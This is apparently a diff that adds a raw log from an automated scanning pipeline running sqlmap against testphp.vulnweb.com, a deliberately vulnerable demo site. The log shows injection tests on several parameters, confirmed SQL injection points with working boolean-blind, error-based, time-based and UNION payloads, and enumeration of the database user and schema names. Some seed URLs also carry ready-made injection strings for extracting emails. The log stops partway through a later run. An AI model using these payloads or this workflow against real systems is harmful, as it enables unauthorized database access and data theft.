+    Payload: test=query=' UNION ALL SELECT 7207,CONCAT(0x71706a6a71,0x685a685251615a434862594a5743485058686b42436c694b6a6947717a7a4a71497649564e746759,0x7170626b71),7207-- -
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:45:14] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
+[08:45:14] [INFO] fetching database names
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+[08:45:15] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0845am.csv'
+
+[*] ending @ 08:45:15 /2025-10-22/
+
+
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?6169xU=
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?r=https://www.harvard-edu.pp.ua
+
+[SQLI - detect] http://testphp.vulnweb.com/comment.php?aid=1A01
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . ["]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:47:41 /2025-10-22/
+
+[08:47:41] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[08:47:41] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com/comment.php?aid=1A01
+do you want to test this URL? [Y/n/q]
+> Y
+[08:47:41] [INFO] testing URL 'http://testphp.vulnweb.com/comment.php?aid=1A01'
+[08:47:41] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0847am.csv' as the CSV results file in multiple targets mode
+[08:47:41] [INFO] testing connection to the target URL
+[08:47:42] [CRITICAL] page not found (404)
+[08:47:42] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+[08:47:42] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0847am.csv'
+
+[*] ending @ 08:47:42 /2025-10-22/
+
+
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/listproducts.php?cat=12.www.vulnsite.com/products/shop.php?id=13
+
+[SQLI - TIMEOUT] http://testphp.vulnweb.com/redir.php?G3zjyx=
+
+[SQLI - detect] http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(email),3 from users
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:53:42 /2025-10-22/
+
+[08:53:42] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[08:53:42] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(email),3 from users
+do you want to test this URL? [Y/n/q]
+> Y
+[08:53:43] [INFO] testing URL 'http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(email),3 from users'
+[08:53:43] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0853am.csv' as the CSV results file in multiple targets mode
+[08:53:43] [INFO] testing connection to the target URL
+[08:53:43] [INFO] checking if the target is protected by some kind of WAF/IPS
+[08:53:43] [INFO] testing if the target URL content is stable
+[08:53:44] [INFO] target URL content is stable
+[08:53:44] [INFO] testing if GET parameter 'artist' is dynamic
+[08:53:44] [INFO] GET parameter 'artist' appears to be dynamic
+[08:53:44] [INFO] heuristic (basic) test shows that GET parameter 'artist' might be injectable (possible DBMS: 'MySQL')
+[08:53:45] [INFO] heuristic (XSS) test shows that GET parameter 'artist' might be vulnerable to cross-site scripting (XSS) attacks
+[08:53:45] [INFO] testing for SQL injection on GET parameter 'artist'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) and risk (2) values? [Y/n] Y
+[08:53:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[08:53:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[08:54:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[08:54:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[08:54:12] [INFO] GET parameter 'artist' appears to be 'Boolean-based blind - Parameter replace (original value)' injectable (with --string="Our")
+[08:54:12] [INFO] testing 'Generic inline queries'
+[08:54:13] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[08:54:13] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[08:54:13] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[08:54:13] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[08:54:14] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[08:54:14] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[08:54:14] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[08:54:15] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[08:54:15] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[08:54:15] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[08:54:15] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[08:54:16] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[08:54:16] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[08:54:16] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[08:54:16] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[08:54:17] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[08:54:17] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[08:54:17] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[08:54:18] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[08:54:18] [WARNING] reflective value(s) found and filtering out
+[08:54:18] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[08:54:18] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[08:54:19] [INFO] GET parameter 'artist' is 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' injectable 
+[08:54:19] [INFO] testing 'MySQL inline queries'
+[08:54:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[08:54:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[08:54:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[08:54:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[08:54:20] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[08:54:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[08:54:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[08:54:21] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[08:54:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[08:54:22] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
+[08:54:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[08:54:22] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
+[08:54:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[08:54:23] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
+[08:54:23] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[08:54:24] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[08:54:24] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
+[08:54:24] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
+[08:54:25] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
+[08:54:25] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
+[08:54:25] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
+[08:54:26] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
+[08:54:26] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[08:54:26] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
+[08:54:26] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[08:54:27] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
+[08:54:27] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[08:54:27] [INFO] testing 'MySQL OR time-based blind (ELT)'
+[08:54:27] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
+[08:54:28] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
+[08:54:28] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[08:54:28] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[08:54:29] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[08:54:59] [INFO] GET parameter 'artist' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace' injectable 
+[08:54:59] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[08:54:59] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[08:55:00] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[08:55:21] [INFO] target URL appears to have 3 columns in query
+[08:55:24] [INFO] GET parameter 'artist' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'artist' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 168 HTTP(s) requests:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: artist=(SELECT (CASE WHEN (9766=9766) THEN 0x2d3120756e696f6e2073656c65637420312c67726f75705f636f6e63617428656d61696c292c332066726f6d207573657273 ELSE (SELECT 9565 UNION SELECT 7369) END))
+
+    Type: error-based
+    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
+    Payload: artist=GTID_SUBSET(CONCAT(0x71706a6b71,(SELECT (ELT(3031=3031,1))),0x71786b7171),3031)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+    Payload: artist=(CASE WHEN (4246=4246) THEN SLEEP(5) ELSE 4246 END)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-2385 UNION ALL SELECT CONCAT(0x71706a6b71,0x5752596a48686559744b585a55796562625a53526e53504c76517a5153554c484f6f697776704552,0x71786b7171),NULL,NULL-- -
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:55:25] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
+[08:55:29] [INFO] fetching current user
+current user: 'acuart@localhost'
+[08:55:29] [INFO] fetching database names
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+[08:55:30] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0853am.csv'
+
+[*] ending @ 08:55:30 /2025-10-22/
+
+
+
+[SQLI - dbs] http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(email),3 from users
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:55:32 /2025-10-22/
+
+[08:55:32] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[08:55:32] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(email),3 from users
+do you want to test this URL? [Y/n/q]
+> Y
+[08:55:32] [INFO] testing URL 'http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(email),3 from users'
+[08:55:32] [INFO] resuming back-end DBMS 'mysql' 
+[08:55:32] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0855am.csv' as the CSV results file in multiple targets mode
+[08:55:32] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: artist=(SELECT (CASE WHEN (9766=9766) THEN 0x2d3120756e696f6e2073656c65637420312c67726f75705f636f6e63617428656d61696c292c332066726f6d207573657273 ELSE (SELECT 9565 UNION SELECT 7369) END))
+
+    Type: error-based
+    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
+    Payload: artist=GTID_SUBSET(CONCAT(0x71706a6b71,(SELECT (ELT(3031=3031,1))),0x71786b7171),3031)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+    Payload: artist=(CASE WHEN (4246=4246) THEN SLEEP(5) ELSE 4246 END)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-2385 UNION ALL SELECT CONCAT(0x71706a6b71,0x5752596a48686559744b585a55796562625a53526e53504c76517a5153554c484f6f697776704552,0x71786b7171),NULL,NULL-- -
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:55:33] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+[08:55:33] [INFO] fetching database names
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+[08:55:33] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0855am.csv'
+
+[*] ending @ 08:55:33 /2025-10-22/
+
+
+
+[SQLI - detect] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1') AND 6311=6311 AND ('vgPb'='vgPb
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:55:33 /2025-10-22/
+
+[08:55:33] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[08:55:34] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com/AJAX/infoartist.php?id=1') AND 6311=6311 AND ('vgPb'='vgPb
+do you want to test this URL? [Y/n/q]
+> Y
+[08:55:34] [INFO] testing URL 'http://testphp.vulnweb.com/AJAX/infoartist.php?id=1') AND 6311=6311 AND ('vgPb'='vgPb'
+[08:55:34] [INFO] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0855am.csv' as the CSV results file in multiple targets mode
+[08:55:34] [INFO] testing connection to the target URL
+[08:55:34] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
+[08:55:34] [INFO] checking if the target is protected by some kind of WAF/IPS
+[08:55:34] [INFO] testing if the target URL content is stable
+[08:55:35] [INFO] target URL content is stable
+[08:55:35] [INFO] testing if GET parameter 'id' is dynamic
+[08:55:35] [INFO] GET parameter 'id' appears to be dynamic
+[08:55:35] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[08:55:35] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
+[08:55:35] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) and risk (2) values? [Y/n] Y
+[08:55:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[08:55:36] [WARNING] reflective value(s) found and filtering out
+[08:55:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[08:55:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[08:56:02] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[08:56:02] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[08:56:03] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[08:56:03] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[08:56:04] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[08:56:04] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[08:56:16] [INFO] testing 'Generic inline queries'
+[08:56:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[08:56:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[08:56:34] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="id")
+[08:56:34] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[08:56:34] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[08:56:34] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[08:56:35] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[08:56:35] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[08:56:35] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[08:56:35] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[08:56:36] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[08:56:36] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[08:56:36] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[08:56:36] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[08:56:37] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[08:56:37] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[08:56:37] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[08:56:37] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[08:56:38] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[08:56:38] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[08:56:38] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[08:56:39] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[08:56:39] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[08:56:39] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[08:56:40] [INFO] GET parameter 'id' is 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' injectable 
+[08:56:40] [INFO] testing 'MySQL inline queries'
+[08:56:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[08:56:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[08:56:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[08:56:41] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[08:56:41] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[08:56:41] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[08:56:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[08:56:42] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[08:56:42] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[08:56:42] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
+[08:56:42] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[08:56:43] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
+[08:56:43] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[08:56:43] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
+[08:56:44] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[08:56:44] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[08:56:45] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
+[08:56:45] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
+[08:57:15] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
+[08:57:15] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
+[08:57:16] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
+[08:57:16] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
+[08:57:16] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[08:57:17] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
+[08:57:17] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[08:57:17] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
+[08:57:18] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[08:57:18] [INFO] testing 'MySQL OR time-based blind (ELT)'
+[08:57:19] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
+[08:57:19] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
+[08:57:19] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[08:57:19] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[08:57:20] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[08:57:50] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace' injectable 
+[08:57:50] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[08:57:50] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[08:57:57] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[08:57:58] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[08:57:59] [INFO] target URL appears to have 3 columns in query
+[08:58:01] [INFO] GET parameter 'id' is 'Generic UNION query (random number) - 1 to 20 columns' injectable
+[08:58:01] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[08:58:02] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expected
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 304 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: id=-1056 OR 4787=4787#
+
+    Type: error-based
+    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
+    Payload: id=GTID_SUBSET(CONCAT(0x717a6a7871,(SELECT (ELT(1272=1272,1))),0x717a626271),1272)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+    Payload: id=(CASE WHEN (9725=9725) THEN SLEEP(5) ELSE 9725 END)
+
+    Type: UNION query
+    Title: Generic UNION query (random number) - 3 columns
+    Payload: id=-9815 UNION ALL SELECT 3466,3466,CONCAT(0x717a6a7871,0x4d6f774371416a684349617a736f507a617457637978544d77547a474e476c654e6b59586d4d4c50,0x717a626271)-- -
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:58:02] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+[08:58:04] [INFO] fetching current user
+current user: 'acuart@localhost'
+[08:58:04] [INFO] fetching database names
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+[08:58:04] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap/results-10222025_0855am.csv'
+
+[*] ending @ 08:58:04 /2025-10-22/
+
+
+
+[SQLI - dbs] http://testphp.vulnweb.com/AJAX/infoartist.php?id=1') AND 6311=6311 AND ('vgPb'='vgPb
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.9.10.5#dev}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:58:05 /2025-10-22/
+
+[08:58:05] [WARNING] using '/app/results/testphp.vulnweb.com_20251022_041356/sqlmap' as the output directory
+[08:58:05] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15' from file '/opt/sqlmap/data/txt/user-agents.txt'
+[1/1] URL:
+GET http://testphp.vulnweb.com/AJAX/infoartist.php?id=1') AND 6311=6311 AND ('vgPb'='vgPb
+do you want to test this URL? [Y/n/q]
+> Y
